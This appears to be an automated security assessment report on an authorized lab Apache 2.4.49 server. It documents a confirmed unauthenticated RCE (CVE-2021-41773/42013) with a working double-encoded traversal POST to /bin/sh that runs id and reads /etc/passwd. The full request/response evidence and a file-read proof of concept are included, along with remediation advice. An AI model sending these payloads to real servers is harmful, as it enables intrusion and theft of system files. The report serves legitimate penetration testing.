# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Unauthenticated RCE — Apache 2.4.49 path traversal (CVE-2021-41773 / CVE-2021-42013)](#finding-1)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [2. CRITICAL — vulnerable-component Outdated Apache httpd 2.4.49 — CVE-2021-41773 path traversal / RCE](#finding-2)
    - [3. INFO — headers Missing Security Response Headers on Root](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0saad6-0f68sr` |
| Target | http://target.local:32811/ |
| Started | 2026-06-30T15:10:42.705Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 1 mapped · 1 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32811`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 critical

_Plus 2 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Unauthenticated RCE — Apache 2.4.49 path traversal (CVE-2021-41773 / CVE-2021-42013)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32811/

The server runs Apache httpd 2.4.49 (Server: Apache/2.4.49 (Unix); evidence ev-mr0sft79-4), which is vulnerable to the path-traversal/RCE flaw CVE-2021-41773 (and its incomplete-fix sibling CVE-2021-42013). A ScriptAlias'd /cgi-bin/ directory is present (returns 403 on listing, ev-mr0sgm2q-9), so mod_cgi executes any file the traversal resolves to. Using a path-encoded traversal that survives normalization (.%%32%65/ → '../') an unauthenticated attacker escapes the document root, reaches /bin/sh, and has mod_cgi execute it with the POST body piped as shell input.

Concrete impact, reproduced twice: the request returned `uid=1(daemon) gid=1(daemon) groups=1(daemon)` (arbitrary command execution as the Apache 'daemon' user) and the full contents of /etc/passwd (`root:x:0:0:root:/root:/bin/bash` …). This is full unauthenticated remote code execution + arbitrary file read on the host. The single-encoded variant (.%2e/, ev-mr0siza7-f) returns 404 and produces no command output, confirming the effect is specific to the bypassing encoding rather than a catch-all.

Severity is critical: pre-auth RCE allows full server compromise, lateral movement, data theft, and persistence.

**Reproduction**

```
1. Confirm version: GET / → `Server: Apache/2.4.49 (Unix)`.
2. Confirm ScriptAlias: GET /cgi-bin/ → 403 Forbidden (directory exists, mod_cgi active).
3. Exploit (arbitrary command execution as user 'daemon' + file read):
   POST http://target.local:32811/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
   Header: Content-Type: text/plain
   Body: echo Content-Type: text/plain; echo; id; echo '---PASSWD---'; cat /etc/passwd
   → HTTP 200, body contains `uid=1(daemon) gid=1(daemon) groups=1(daemon)` and the full /etc/passwd.
4. Negative control: same POST with single-encoded `.%2e/` segments → HTTP 404, no command output.
Remediation: upgrade Apache httpd to 2.4.51 or later immediately; if upgrade is delayed, set `Require all denied` on the filesystem root and disable mod_cgi / the /cgi-bin ScriptAlias. Treat the host as potentially compromised and rotate any secrets reachable from it.
```

**Evidence**

- Evidence `ev-mr0siza7-f` — `artifacts/_/ev-mr0siza7-f/`

Request:

```http
POST /bin/sh HTTP/1.1
Host: target.local:32811
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: text/plain

echo Content-Type: text/plain; echo; id; echo '---PASSWD---'; cat /etc/passwd
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 196
content-type: text/html; charset=iso-8859-1
date: Tue, 30 Jun 2026 15:17:27 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.49 (Unix)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

- Evidence `ev-mr0sihdf-e` — `artifacts/_/ev-mr0sihdf-e/`

Request:

```http
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: target.local:32811
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: text/plain

echo Content-Type: text/plain; echo; id; echo '---PASSWD---'; cat /etc/passwd
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 984
content-type: text/plain
date: Tue, 30 Jun 2026 15:17:04 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.49 (Unix)

uid=1(daemon) gid=1(daemon) groups=1(daemon)
---PASSWD---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

- Evidence `ev-mr0sj0mq-g` — `artifacts/_/ev-mr0sj0mq-g/`

Request:

```http
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: target.local:32811
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: text/plain

echo Content-Type: text/plain; echo; id; echo '---PASSWD---'; cat /etc/passwd
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 984
content-type: text/plain
date: Tue, 30 Jun 2026 15:17:29 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.49 (Unix)

uid=1(daemon) gid=1(daemon) groups=1(daemon)
---PASSWD---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-2"></a>

### 2. [SUSPECTED] [CRITICAL] [vulnerable-component] Outdated Apache httpd 2.4.49 — CVE-2021-41773 path traversal / RCE

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32811/

**Anomaly (why this is a lead):** Apache/2.4.49 (Unix) detected via the Server response header on the site root. Version 2.4.49 is affected by CVE-2021-41773: a path-traversal flaw in the URL-normalization of mod_rewrite/aliased directories that allows reading files outside the document root (e.g. /etc/passwd), and remote code execution when mod_cgi is enabled on the traversed path. Version-based match, not yet exploited.

Apache HTTP Server 2.4.49 ships the broken path-normalization introduced in that release. CVE-2021-41773 (CVSS 7.5, raised to critical with RCE) enables LFI/path-traversal via encoded dot-segments against any directory configured with `Require all granted` (default /icons/, /cgi-bin/), and RCE if those dirs map to CGI handlers. The follow-up CVE-2021-42013 (2.4.50) is the incomplete-fix bypass. Remediation: upgrade to 2.4.51+. Confirming with a read-only GET of /etc/passwd.

**Reproduction**

```
1. GET http://target.local:32811/ → response header `Server: Apache/2.4.49 (Unix)`. 2. Cross-reference 2.4.49 against CVE-2021-41773. 3. Active PoC: GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (read-only file disclosure).
```

**Evidence**

- Evidence `ev-mr0skctk-h` — `artifacts/_/ev-mr0skctk-h/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32811
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 45
content-type: text/html
date: Tue, 30 Jun 2026 15:18:32 GMT
etag: "2d-432a5e4a73a80"
keep-alive: timeout=5, max=100
last-modified: Mon, 11 Jun 2007 18:53:14 GMT
server: Apache/2.4.49 (Unix)

<html><body><h1>It works!</h1></body></html>
```

<a id="finding-3"></a>

### 3. [SUSPECTED] [INFO] [headers] Missing Security Response Headers on Root

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32811/

**Anomaly (why this is a lead):** Root page returns only Content-Type header; CSP, X-Frame-Options, X-Content-Type-Options, HSTS, and Referrer-Policy are all absent. Page body is the bare Apache default ("It works!" — 45 bytes), indicating default server config with no security hardening applied.

The root page (/) returns only `Content-Type: text/html`. All standard security response headers are absent: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy. The body is the Apache default "It works!" page (45 bytes), confirming a bare default configuration.

**Reproduction**

```
GET http://target.local:32811/ — inspect response headers. Only Content-Type is present.
```

**Evidence**

- Evidence `ev-mr0scfjv-1` — `artifacts/s-0001/ev-mr0scfjv-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32811
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 45
content-type: text/html
date: Tue, 30 Jun 2026 15:12:22 GMT
etag: "2d-432a5e4a73a80"
keep-alive: timeout=5, max=100
last-modified: Mon, 11 Jun 2007 18:53:14 GMT
server: Apache/2.4.49 (Unix)

<html><body><h1>It works!</h1></body></html>
```
